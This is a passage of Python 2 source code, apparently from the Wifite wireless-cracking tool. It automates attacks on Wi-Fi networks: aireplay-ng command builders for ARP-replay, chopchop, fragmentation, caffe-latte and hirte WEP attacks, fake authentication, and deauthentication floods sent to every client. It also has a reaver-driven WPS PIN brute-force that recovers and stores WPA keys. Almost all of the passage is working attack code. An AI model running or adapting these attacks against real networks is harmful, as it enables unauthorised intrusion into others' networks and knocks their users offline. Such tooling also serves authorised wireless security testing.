                    remove_file(self.RUN_CONFIG.temp + 'wepkey.txt')
                    print ''
                    if response == 'e':
                        self.RUN_CONFIG.exit_gracefully(0)
                    return

                elif response == 'c':
                    # Continue attacks
                    # Need to backup temp/wep-01.cap and remove airodump files
                    i = 2
                    while os.path.exists(self.RUN_CONFIG.temp + 'wep-' + str(i) + '.cap'):
                        i += 1
                    copy(self.RUN_CONFIG.temp + "wep-01.cap", self.RUN_CONFIG.temp + 'wep-' + str(i) + '.cap')
                    remove_airodump_files(self.RUN_CONFIG.temp + 'wep')

                    # Need to restart airodump-ng, as it's been interrupted/killed
                    proc_airodump = Popen(cmd_airodump, stdout=DN, stderr=DN)

                    # Say we haven't started cracking yet, so we re-start if needed.
                    started_cracking = False

                    # Reset IVs counters for proper behavior
                    total_ivs += ivs
                    ivs = 0
                    last_ivs = 0

                    # Also need to remember to crack "temp/*.cap" instead of just wep-01.cap
                    pass

        if successful:
            print GR + '\n [0:00:00]' + W + ' attack complete: ' + G + 'success!' + W
        else:
            print GR + '\n [0:00:00]' + W + ' attack complete: ' + R + 'failure' + W
        
        if self.RUN_CONFIG.WEP_SAVE and total_ivs + ivs > 0:
            # Save packets
            self.save_wep_packet(self.target, total_ivs+ivs)

        send_interrupt(proc_airodump)
        if proc_aireplay != None:
            send_interrupt(proc_aireplay)

        # Remove files generated by airodump/aireplay/packetforce
        for filename in os.listdir('.'):
            if filename.startswith('replay_arp-') and filename.endswith('.cap'):
                remove_file(filename)
        remove_airodump_files(self.RUN_CONFIG.temp + 'wep')
        remove_file(self.RUN_CONFIG.temp + 'wepkey.txt')
    def save_wep_packet(self,target, ivs):
        try:
            path=self.RUN_CONFIG.WEP_IVS_DIR
            os.mkdir(path)
        except OSError:
            pass
        i=1
        while True:
            save_as = path + str(target) + '_' + str(i) + '.cap'
            if not os.path.exists(save_as):
                break
            i+=1
        try:
            rename(self.RUN_CONFIG.temp + 'wep-01.cap', save_as)
            println_info(('%s%d%s IVs packet captured are saved to ' + G + save_as) % (G,ivs,W))
            
        except OSError:
            println_error('unable to save capture file!')
        #else:


    def wep_fake_auth(self, iface, target, time_to_display):
        """
            Attempt to (falsely) authenticate with a WEP access point.
            Gives 3 seconds to make each 5 authentication attempts.
            Returns True if authentication was successful, False otherwise.
        """
        max_wait = 3  # Time, in seconds, to allow each fake authentication
        max_attempts = 5  # Number of attempts to make

        for fa_index in xrange(1, max_attempts + 1):
            print '\r                                                            ',
            print '\r %s attempting %sfake authentication%s (%d/%d)... ' % \
                  (GR + time_to_display + W, G, W, fa_index, max_attempts),
            stdout.flush()

            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '-1', '0',  # Fake auth, no delay
                   '-a', target.bssid,
                   '-T', '1']  # Make 1 attempt
            if target.ssid != '':
                cmd.append('-e')
                cmd.append(target.ssid)
            cmd.append(iface)

            proc_fakeauth = Popen(cmd, stdout=PIPE, stderr=DN)
            started = time.time()
            while proc_fakeauth.poll() == None and time.time() - started <= max_wait: pass
            if time.time() - started > max_wait:
                send_interrupt(proc_fakeauth)
                print R + 'failed' + W,
                stdout.flush()
                time.sleep(0.5)
                continue

            result = proc_fakeauth.communicate()[0].lower()
            if result.find('switching to shared key') != -1 or \
                    result.find('rejects open system'): pass
            if result.find('association successful') != -1:
                print G + 'success!' + W
                return True

            print R + 'failed' + W,
            stdout.flush()
            time.sleep(0.5)
            continue
        print ''
        return False

    def get_aireplay_command(self, iface, attack_num, target, clients, client_mac):
        """
            Returns aireplay-ng command line arguments based on parameters.
        """
        cmd = ''
        if attack_num == 0:
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--arpreplay',
                   '-b', target.bssid,
                   '-x', str(self.RUN_CONFIG.WEP_PPS)]  # Packets per second
            if client_mac != '':
                cmd.append('-h')
                cmd.append(client_mac)
            elif len(clients) > 0:
                cmd.append('-h')
                cmd.append(clients[0].bssid)
            cmd.append(iface)

        elif attack_num == 1:
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--chopchop',
                   '-b', target.bssid,
                   '-x', str(self.RUN_CONFIG.WEP_PPS),  # Packets per second
                   '-m', '60',  # Minimum packet length (bytes)
                   '-n', '82',  # Maxmimum packet length
                   '-F']  # Automatically choose the first packet
            if client_mac != '':
                cmd.append('-h')
                cmd.append(client_mac)
            elif len(clients) > 0:
                cmd.append('-h')
                cmd.append(clients[0].bssid)
            cmd.append(iface)

        elif attack_num == 2:
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--fragment',
                   '-b', target.bssid,
                   '-x', str(self.RUN_CONFIG.WEP_PPS),  # Packets per second
                   '-m', '100',  # Minimum packet length (bytes)
                   '-F']  # Automatically choose the first packet
            if client_mac != '':
                cmd.append('-h')
                cmd.append(client_mac)
            elif len(clients) > 0:
                cmd.append('-h')
                cmd.append(clients[0].bssid)
            cmd.append(iface)

        elif attack_num == 3:
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--caffe-latte',
                   '-b', target.bssid]
            if len(clients) > 0:
                cmd.append('-h')
                cmd.append(clients[0].bssid)
            cmd.append(iface)

        elif attack_num == 4:
            cmd = ['aireplay-ng', '--ignore-negative-one', '--interactive', '-b', target.bssid, '-c',
                   'ff:ff:ff:ff:ff:ff', '-t', '1', '-x', str(self.RUN_CONFIG.WEP_PPS), '-F', '-p', '0841', iface]

        elif attack_num == 5:
            if len(clients) == 0:
                print R + ' [0:00:00] unable to carry out hirte attack: ' + O + 'no clients'
                return ''
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--cfrag',
                   '-h', clients[0].bssid,
                   iface]

        return cmd

    def wep_send_deauths(self, iface, target, clients):
        """
            Sends deauth packets to broadcast and every client.
        """
        # Send deauth to broadcast
        cmd = ['aireplay-ng',
               '--ignore-negative-one',
               '--deauth', str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),
               '-a', target.bssid,
               iface]
        call(cmd, stdout=DN, stderr=DN)
        # Send deauth to every client
        for client in clients:
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--deauth', str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),
                   '-a', target.bssid,
                   '-h', client.bssid,
                   iface]
            call(cmd, stdout=DN, stderr=DN)


#################
# WPS FUNCTIONS #
#################
class WPSAttack(Attack):
    def __init__(self, iface, target, config):
        self.iface = iface
        self.target = target
        self.RUN_CONFIG = config

        try:
           os.mkdir(self.RUN_CONFIG.WPS_SESSION_DIR)
        except OSError:
           pass
    def RunAttack(self):
        '''
            Abstract method for initializing the WPS attack
        '''
        self.attack_wps()

    def EndAttack(self):
        '''
            Abstract method for ending the WPS attack
        '''
        pass

    def attack_wps(self):
        """
            Mounts attack against target on iface.
            Uses "reaver" to attempt to brute force the PIN.
            Once PIN is found, PSK can be recovered.
            PSK is displayed to user and added to WPS_FINDINGS
        """
        print GR + ' [0:00:00]' + W + ' starting %sWPS PIN attack%s on "%s" (%s) with signal strength %s%ddB%s' % \
                                      (G, W, G + self.target.ssid + W, G + self.target.bssid + W, G, self.target.power, W)
        output_filename=self.RUN_CONFIG.temp + str(self.target) + '.wps'
        
        session_filename=re.sub(r'[^a-zA-Z0-9]', '', self.target.bssid) + '.wpc'
        session_filename_with_path=self.RUN_CONFIG.WPS_SESSION_DIR +  session_filename
                    
        cmd = ['reaver',
               '-i', self.iface,
               '-b', self.target.bssid,
               '-o', output_filename, # self.RUN_CONFIG.temp + str(self.target) + '.out',  # Dump output to file to be monitored
               '-a',  # auto-detect best options, auto-resumes sessions, doesn't require input!
               '-c', self.target.channel,
               # '--ignore-locks',
               '-vv']  # verbose output
               
        backup_session_file = self.RUN_CONFIG.WPS_SAVE
        last_backup_time=0

        # if progress file found in current folder, load it and disable backup from reaver folder
        if os.path.exists(session_filename_with_path):
            cmd += ['-s', session_filename_with_path]
            backup_session_file = False
        else:
            #if progress file found in reaver folder, load it
            filename='/usr/local/etc/reaver/' + session_filename
            if os.path.exists(filename):
                cmd += ['-s', filename]
        proc = Popen(cmd, stdout=DN, stderr=DN)

        cracked = False  # Flag for when password/pin is found
        percent = 'x.xx%'  # Percentage complete
        aps = 'x'  # Seconds per attempt
        time_started = time.time()
        last_success = time_started  # Time of last successful attempt
        last_pin = ''  # Keep track of last pin tried (to detect retries)
        retries = 0  # Number of times we have attempted this PIN
        tries_total = 0  # Number of times we have attempted all pins
        tries = 0  # Number of successful attempts
        pin = ''
        key = ''

        try:
            while not cracked:
                time.sleep(1)

                if proc.poll() != None:
                    # Process stopped: Cracked? Failed?
                    inf = open(output_filename, 'r')
                    lines = inf.read().split('\n')
                    inf.close()
                    for line in lines:
                        # When it's cracked:
                        if line.find("WPS PIN: '") != -1:
                            pin = line[line.find("WPS PIN: '") + 10:-1]
                        if line.find("WPA PSK: '") != -1:
                            key = line[line.find("WPA PSK: '") + 10:-1]
                            cracked = True
                    break

                if not os.path.exists(output_filename): continue

                inf = open(output_filename, 'r')
                lines = inf.read().split('\n')
                inf.close()

                for line in lines:
                    if line.strip() == '': continue
                    # Status
                    if line.find(' complete @ ') != -1 and len(line) > 8:
                        percent = line.split(' ')[1]
                        i = line.find(' (')
                        j = line.find(' seconds/', i)
                        if i != -1 and j != -1: aps = line[i + 2:j]
                    # PIN attempt
                    elif line.find(' Trying pin ') != -1:
                        pin = line.strip().split(' ')[-1]
                        if pin == last_pin:
                            retries += 1
                        elif tries_total == 0:
                            last_pin = pin
                            tries_total -= 1
                        else:
                            last_success = time.time()
                            tries += 1
                            last_pin = pin
                            retries = 0
                        tries_total += 1

                    # Warning
                    elif line.endswith('10 failed connections in a row'):
                        pass

                    # Check for PIN/PSK
                    elif line.find("WPS PIN: '") != -1:
                        pin = line[line.find("WPS PIN: '") + 10:-1]
                    elif line.find("WPA PSK: '") != -1:
                        key = line[line.find("WPA PSK: '") + 10:-1]
                        cracked = True
                    if cracked: break

                print ' %s WPS attack, %s success/ttl,' % \
                      (GR + sec_to_hms(time.time() - time_started) + W, \
                       G + str(tries) + W + '/' + O + str(tries_total) + W),

                if percent == 'x.xx%' and aps == 'x':
                    print '\r',
                else:
                    print '%s complete (%s sec/att)   \r' % (G + percent + W, G + aps + W),
                
                if self.RUN_CONFIG.WPS_TIMEOUT > 0 and (time.time() - last_success) > self.RUN_CONFIG.WPS_TIMEOUT:
                    print R + '\n [!]' + O + ' unable to complete successful try in %d seconds' % (
                    self.RUN_CONFIG.WPS_TIMEOUT)
                    print R + ' [+]' + W + ' skipping "%s" (%s)' % (O + self.target.ssid + W, O + self.target.bssid + W)
                    break

                if self.RUN_CONFIG.WPS_MAX_RETRIES > 0 and retries > self.RUN_CONFIG.WPS_MAX_RETRIES:
                    print R + '\n [!]' + O + ' unable to complete successful try in %d retries' % (
                    self.RUN_CONFIG.WPS_MAX_RETRIES)
                    print R + ' [+]' + O + ' the access point may have WPS-locking enabled, or is too far away' + W
                    print R + ' [+]' + W + ' skipping "%s" (%s)' % (O + self.target.ssid + W, O + self.target.bssid + W)
                    break

                if self.RUN_CONFIG.WPS_RATIO_THRESHOLD > 0.0 and tries > 0 and (
                    float(tries) / tries_total) < self.RUN_CONFIG.WPS_RATIO_THRESHOLD:
                    print R + '\n [!]' + O + ' successful/total attempts ratio was too low (< %.2f)' % (
                    self.RUN_CONFIG.WPS_RATIO_THRESHOLD)
                    print R + ' [+]' + W + ' skipping "%s" (%s)' % (G + self.target.ssid + W, G + self.target.bssid + W)
                    break

                stdout.flush()
                # Clear out output file if bigger than 1mb
                inf = open(output_filename, 'w')
                inf.close()
                
                #Backup session file
                if backup_session_file == True and time.time() - last_backup_time > 30:
                    last_backup_time = time.time()
                    filename='/usr/local/etc/reaver/' + session_filename
                    if os.path.exists(filename):
                        proc=Popen(['cp',filename,session_filename_with_path], stdout=DN, stderr=DN)
                        proc.wait()
                        println_debug("Session file %s backuped to %s" % (filename,session_filename_with_path))
                    
            # End of big "while not cracked" loop
            filename='/usr/local/etc/reaver/' + session_filename
            if os.path.exists(filename):
                proc=Popen(['cp',filename,session_filename_with_path], stdout=DN, stderr=DN)
                proc.wait()
            if cracked:
                if pin != '': println_info(G + ' PIN found:     %s' % (C + pin + W))
                if key != '': println_info('%sWPA key found:%s %s' % (G, W, C + key + W))
                self.RUN_CONFIG.WPA_FINDINGS.append(W + "found %s (%s)'s WPA key: \"%s\", WPS PIN: %s" % (
                G + self.target.ssid + W, G + self.target.bssid + W, C + key + W, C + pin + W))
                self.RUN_CONFIG.WPA_FINDINGS.append('')

                t = Target(self.target.bssid, 0, 0, 0, 'WPA', self.target.ssid)
                t.key = key
                t.wps = pin
                self.RUN_CONFIG.save_cracked(t)

        except KeyboardInterrupt:
            print R + '\n (^C)' + O + ' WPS brute-force attack interrupted' + W
            if attack_interrupted_prompt():
                send_interrupt(proc)
                print ''
                self.RUN_CONFIG.exit_gracefully(0)

        send_interrupt(proc)

        return cracked


if __name__ == '__main__':
    RUN_CONFIG = RunConfiguration()
    try:
        banner(RUN_CONFIG)
        engine = RunEngine(RUN_CONFIG)
        engine.Start()
        RUN_CONFIG.exit_gracefully(0)
        #main(RUN_CONFIG)
    except KeyboardInterrupt:
        print R + '\n (^C)' + O + ' interrupted\n' + W
        RUN_CONFIG.exit_gracefully(1)
    except EOFError:
        print R + '\n (^D)' + O + ' interrupted\n' + W
        RUN_CONFIG.exit_gracefully(1)
    #except:
    #    RUN_CONFIG.exit_gracefully(1)
    #    raise
        


